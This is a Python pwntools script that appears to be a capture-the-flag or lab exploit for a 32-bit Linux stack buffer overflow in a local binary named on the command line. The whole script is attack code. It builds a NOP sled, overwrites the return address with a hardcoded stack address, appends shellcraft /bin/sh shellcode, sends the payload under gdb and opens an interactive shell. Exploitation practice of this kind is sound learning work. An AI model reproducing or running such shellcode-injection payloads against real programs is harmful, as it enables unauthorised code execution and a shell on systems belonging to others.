# take filename as argument
# take desired fn name as argument
# take sequence length as arg default 50
import argparse
from pwn import *
import fnmatch
parser = argparse.ArgumentParser()
parser.add_argument("exe", help="Executable name")
parser.add_argument("--seqlen", type=int, default=50, help="Overflow sequence length")

args = parser.parse_args()
exe, seqlen = args.exe, args.seqlen

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# elf=ELF(exe)
# jmp_esp=asm("jmp esp")
# jmp_esp=next(elf.search(jmp_esp))
# second round with offset from ip
smashoffset = 512#cyclic_find(smash_in_ip)
print("smashoffset: ", smashoffset )
sh = process(exe)
context.update(arch='i386', os='linux')

# shellcode = shellcraft.sh()
shellcode=shellcraft.i386.linux.sh()
print(shellcode)
print(hexdump(asm(shellcode)))
# proof that shellcode works
# p = run_assembly(shellcode)
# p.interactive()

rip_at_crash_str="0xffffd074"
jump_offset=201
nop_slide_length=201
rip_at_crash=int(rip_at_crash_str, 16)
start_of_shellcode_or_nop_slide = rip_at_crash + 200
print("RIP at crash: ", hex(rip_at_crash), " offset for nop slide: ", jump_offset, " address for slide: ", hex(start_of_shellcode_or_nop_slide))

payload =  asm("nop")*(smashoffset)
# payload += p32(0xdeadbee0)
payload += p32(start_of_shellcode_or_nop_slide)
# payload += p32(0xdeadbee1)
payload += asm("nop")*nop_slide_length
# payload += p32(0xdeadbee2)
payload += asm(shellcode)
payload += p32(0xdeadbee3)

filtered_payload = payload# bytes(b for b in payload if b not in {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20})

print("Trying to smash stack with: ", filtered_payload, "length: ", smashoffset)
gdb.attach(sh, '''
#break *0x08049194
''')
sh.sendline(filtered_payload)
sh.interactive()
